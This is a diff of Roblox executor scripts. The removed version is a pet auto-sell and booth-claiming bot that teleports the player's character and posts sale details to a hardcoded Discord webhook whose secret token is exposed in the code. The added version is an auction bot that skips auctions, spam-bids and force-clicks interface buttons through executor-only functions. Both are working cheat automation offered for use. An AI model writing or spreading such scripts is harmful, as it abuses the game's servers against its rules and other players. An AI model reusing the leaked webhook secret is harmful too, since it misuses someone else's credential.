@@ -1,236 +1,196 @@
-if game.PlaceId ~= 95383978784657 then return end
-if not request then return end
-
-local RS = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
-local CS = game:GetService("CollectionService")
-local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local Replication = require(RS.Game.Replication)
-local Network = require(RS.Modules.Network)
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
 
-local LP = Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "ValentineAuctionUI"
+gui.Parent = PlayerGui
+gui.ResetOnSpawn = false
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1466018830391312532/fUDtg2f_MNlYnc449bHOqON5CMiQp4d8eHbUpNfOBrXOZlyY2zGyD7iT_EL61bYVz_qX"
+local background = Instance.new("Frame")
+background.Size = UDim2.fromScale(1,1)
+background.BackgroundColor3 = Color3.fromRGB(0,0,0)
+background.BackgroundTransparency = 0.5
+background.Parent = gui
 
-getgenv().AutoSellConfig = getgenv().AutoSellConfig or {
-	Enabled = true,
-	ScanInterval = 1.5,
-	MaxListings = 15,
-	Pets = {
-		["Surge Dragon"] = 50,
-		["Dual Shock"] = 100,
-		["Overcharged Robot"] = 250,
-		["Fortunate Calico"] = 250,
-		["SUPER Luckyblock"] = 60,
-		["JACKPOT"] = 675,
-		["Frost Queen"] = 10,
-		["5M Frost Monarch"] = 1000,
-		["5M North Star"] = 100,
-		["Frosty Snowman"] = 50
-	}
-}
+local highlight = Instance.new("Frame")
+highlight.Size = UDim2.fromScale(1,1)
+highlight.Position = UDim2.new(0,0,0,0)
+highlight.BackgroundTransparency = 1
+highlight.BorderSizePixel = 4
+highlight.BorderColor3 = Color3.fromRGB(255,255,255)
+highlight.Parent = gui
 
-local listed, busy = {}, false
-local lastPets, sent = {}, {}
-local tracked = {}
+local container = Instance.new("Frame")
+container.Size = UDim2.fromScale(0.6,0.78)
+container.Position = UDim2.fromScale(0.2,0.1)
+container.BackgroundTransparency = 1
+container.Parent = background
 
-local function getAmount(p)
-	local amt = getgenv().AutoSellConfig.Pets[p.Name]
-	if not amt then return end
-	if p.Tier and p.Tier ~= "Normal" then return end
-	return amt
-end
+local userLabel = Instance.new("TextLabel")
+userLabel.Size = UDim2.new(1,0,0,50)
+userLabel.Position = UDim2.new(0,0,0,0)
+userLabel.BackgroundTransparency = 1
+userLabel.Text = "👤 "..player.Name
+userLabel.TextScaled = true
+userLabel.Font = Enum.Font.GothamBold
+userLabel.TextColor3 = Color3.fromRGB(255,255,255)
+userLabel.Parent = container
 
-local function sendSold(petId, info)
-	if sent[petId] then return end
-	sent[petId] = true
+local contentFrame = Instance.new("Frame")
+contentFrame.Size = UDim2.new(1,0,1,-60)
+contentFrame.Position = UDim2.new(0,0,0,50)
+contentFrame.BackgroundTransparency = 1
+contentFrame.Parent = container
 
-	request({
-		Url = WEBHOOK_URL,
-		Method = "POST",
-		Headers = {["Content-Type"]="application/json"},
-		Body = HttpService:JSONEncode({
-			username = "Auto Sell",
-			embeds = {{
-				title = "💸 Pet Sold",
-				color = 0xff5555,
-				fields = {
-					{name="Player", value=LP.Name, inline=true},
-					{name="Pet", value=info.name or "Unknown", inline=true},
-					{name="Tier", value=info.tier or "Normal", inline=true},
-					{name="Amount", value="+ "..tostring(info.amount or 0).." tokens", inline=true},
-					{name="Pet ID", value=tostring(petId), inline=true}
-				},
-				timestamp = DateTime.now():ToIsoDate()
-			}}
-		})
-	})
-end
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0,12)
+layout.Parent = contentFrame
 
-local function snapshot()
-	local t = {}
-	for id in pairs(Replication.Data.Pets or {}) do
-		t[id] = true
-	end
-	return t
-end
+local heartsLabel = Instance.new("TextLabel")
+heartsLabel.Size = UDim2.new(1,0,0,40)
+heartsLabel.BackgroundTransparency = 1
+heartsLabel.TextScaled = true
+heartsLabel.Font = Enum.Font.GothamBold
+heartsLabel.TextColor3 = Color3.fromRGB(255,255,255)
+heartsLabel.Parent = contentFrame
 
-local function autoList()
-	if busy or not getgenv().AutoSellConfig.Enabled then return end
-	busy = true
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1,0,0,35)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextScaled = true
+statusLabel.Font = Enum.Font.GothamBold
+statusLabel.TextColor3 = Color3.fromRGB(255,255,255)
+statusLabel.Text = "🕓 Idle"
+statusLabel.Parent = contentFrame
 
-	local pets = Replication.Data.Pets or {}
-	local pool = {}
+local valentineCount = 0
+local cashEarned = 0
+local auctionStep = "Idle"
 
-	for id, p in pairs(pets) do
-		if not listed[id]
-			and not p.Locked
-			and not p.Trading
-			and p.Tier == "Normal"
-			and getgenv().AutoSellConfig.Pets[p.Name] then
-			pool[#pool+1] = { id = id, pet = p }
-		end
-	end
-
-	for i = #pool, 2, -1 do
-		local j = math.random(i)
-		pool[i], pool[j] = pool[j], pool[i]
-	end
-
-	local c = 0
-	for _, entry in ipairs(pool) do
-		if c >= getgenv().AutoSellConfig.MaxListings then break end
-
-		local p = entry.pet
-		local id = entry.id
-		local amt = getAmount(p)
-
-		if amt then
-			local sellAmt = math.ceil(amt)
-			if Network:InvokeServer("ListItem", "Pet", id, sellAmt) then
-				listed[id] = true
-				tracked[id] = {
-					name = p.Name,
-					tier = p.Tier or "Normal",
-					amount = sellAmt
-				}
-				c += 1
-			end
-			task.wait(0.15)
-		end
-	end
-
-	busy = false
+local function updateUI()
+    heartsLabel.Text = "💘 Valentines: "..valentineCount.." | 💸 Cash: "..cashEarned
+    if auctionStep == "Found" then
+        highlight.BorderColor3 = Color3.fromRGB(0,255,0)
+    elseif auctionStep == "Scanning" or auctionStep == "Bidding" then
+        highlight.BorderColor3 = Color3.fromRGB(255,255,0)
+    elseif auctionStep == "Idle" then
+        highlight.BorderColor3 = Color3.fromRGB(255,255,255)
+    elseif auctionStep == "Full" then
+        highlight.BorderColor3 = Color3.fromRGB(255,0,0)
+    end
+    statusLabel.Text = auctionStep
 end
 
 task.spawn(function()
-	while true do
-		pcall(autoList)
-		task.wait(getgenv().AutoSellConfig.ScanInterval)
-	end
+    while true do
+        updateUI()
+        task.wait(0.5)
+    end
+end)
+
+local AuctionsFolder = workspace:WaitForChild("Debris"):WaitForChild("Auctions")
+local ItemsModule = require(ReplicatedStorage.Modules.Items)
+local Auctions = ReplicatedStorage:WaitForChild("Events"):WaitForChild("Auctions")
+local EnterQueue = Auctions:WaitForChild("EnterQueue")
+local Skip = Auctions:WaitForChild("Skip")
+local SkipCountdown = Auctions:WaitForChild("SkipCountdown")
+local UpdateCurrentBid = Auctions:WaitForChild("UpdateCurrentBid")
+local PlaceBid = Auctions:WaitForChild("PlaceBid")
+
+local currentNextBid
+local currentBidder
+local foundValentine = false
+local inAuction = false
+
+UpdateCurrentBid.OnClientEvent:Connect(function(data)
+    if not data then return end
+    currentNextBid = data.nextBid
+    currentBidder = data.player
+end)
+
+AuctionsFolder.ChildAdded:Connect(function() inAuction = true end)
+AuctionsFolder.ChildRemoved:Connect(function() if #AuctionsFolder:GetChildren() == 0 then inAuction = false end end)
+
+task.spawn(function()
+    while true do
+        auctionStep = "Joining Auction Queue"
+        pcall(function() EnterQueue:InvokeServer("1") end)
+        repeat task.wait(0.5) until inAuction
+        auctionStep = "Scanning"
+        while inAuction and not foundValentine do
+            local garages = AuctionsFolder:GetChildren()
+            for _, garage in ipairs(garages) do
+                local itemsFolder = garage:FindFirstChild("Items")
+                local hasValentine = false
+                if itemsFolder then
+                    for _, itemInstance in pairs(itemsFolder:GetChildren()) do
+                        local itemData = ItemsModule[itemInstance.Name]
+                        if itemData and string.find(string.lower(itemData.Name),"valentine") then
+                            foundValentine = true
+                            hasValentine = true
+                            break
+                        end
+                    end
+                end
+                if not hasValentine then
+                    pcall(function() SkipCountdown:InvokeServer() end)
+                    task.wait(0.05)
+                    pcall(function() Skip:InvokeServer() end)
+                end
+                if foundValentine then break end
+            end
+            task.wait(0.5)
+        end
+        repeat task.wait(1) until not inAuction
+        if foundValentine then auctionStep = "Found" end
+        task.wait(0.5)
+    end
 end)
 
 task.spawn(function()
-	lastPets = snapshot()
-	while true do
-		task.wait(1)
-		local now = snapshot()
-
-		for id in pairs(lastPets) do
-			if not now[id] then
-				local info = tracked[id]
-				if info then
-					sendSold(id, info)
-					tracked[id] = nil
-				end
-			end
-		end
-
-		lastPets = now
-	end
+    while true do
+        task.wait(0.3)
+        if inAuction and currentNextBid and currentBidder ~= player and not foundValentine then
+            auctionStep = "Bidding"
+            pcall(function() PlaceBid:InvokeServer(currentNextBid) end)
+        end
+    end
 end)
 
-local function countConfigPets()
-	local c = 0
-	for _, p in pairs(Replication.Data.Pets or {}) do
-		if p.Tier == "Normal" and getgenv().AutoSellConfig.Pets[p.Name] then
-			c += 1
-		end
-	end
-	return c
+local function clickOkButton()
+    local function tryClick(obj)
+        pcall(function() obj:Activate() end)
+        if getconnections then
+            for _,v in pairs(getconnections(obj.MouseButton1Click)) do
+                pcall(function() v:Fire() end)
+            end
+        end
+    end
+    local function checkForButton()
+        local itemsWon = PlayerGui:FindFirstChild("ItemsWon",true)
+        if itemsWon then
+            local button = itemsWon:FindFirstChild("Button",true)
+            if button then tryClick(button) end
+        end
+    end
+    checkForButton()
+    PlayerGui.DescendantAdded:Connect(function(obj)
+        if obj.Name == "Button" then
+            task.wait()
+            tryClick(obj)
+        end
+    end)
+    task.spawn(function()
+        while true do
+            task.wait(0.5)
+            checkForButton()
+        end
+    end)
 end
 
-task.spawn(function()
-	while true do
-		task.wait(30)
-		if countConfigPets() == 0 then
-			pcall(function() LP:Kick("Out of configured pets") end)
-			return
-		end
-	end
-end)
-
-local function ownBooth()
-	for _,b in ipairs(CS:GetTagged("Booth")) do
-		if b:GetAttribute("BoothOwner") == LP.UserId then
-			return b
-		end
-	end
-end
-
-local function hrp()
-	local ch = LP.Character or LP.CharacterAdded:Wait()
-	return ch:WaitForChild("HumanoidRootPart")
-end
-
-local function randPlr()
-	local t = {}
-	for _,p in ipairs(Players:GetPlayers()) do
-		if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-			t[#t+1] = p
-		end
-	end
-	if #t == 0 then return end
-	return t[math.random(#t)]
-end
-
-task.spawn(function()
-	repeat task.wait(0.2) until #CS:GetTagged("Booth") > 0
-	math.randomseed(os.clock())
-	local r = 20
-
-	while true do
-		local ob = ownBooth()
-		if ob and ob.PrimaryPart then
-			local h = hrp()
-			h.CFrame = ob.PrimaryPart.CFrame * CFrame.new(0,5,0)
-			return
-		end
-
-		local tp = randPlr()
-		if tp and tp.Character and tp.Character:FindFirstChild("HumanoidRootPart") then
-			local pos = tp.Character.HumanoidRootPart.Position
-			for _,b in ipairs(CS:GetTagged("Booth")) do
-				if b.PrimaryPart and b:GetAttribute("BoothOwner") == nil
-				and (b.PrimaryPart.Position - pos).Magnitude <= r then
-					Network:InvokeServer("ClaimBooth", b)
-					local t0 = tick()
-					while tick() - t0 < 1 do
-						if b:GetAttribute("BoothOwner") == LP.UserId then
-							local h = hrp()
-							h.CFrame = b.PrimaryPart.CFrame * CFrame.new(0,5,0)
-							h.AssemblyLinearVelocity = Vector3.zero
-							h.AssemblyAngularVelocity = Vector3.zero
-							return
-						end
-						task.wait()
-					end
-				end
-			end
-		end
-
-		r += 20
-		task.wait(0.5)
-	end
-end)
+clickOkButton()
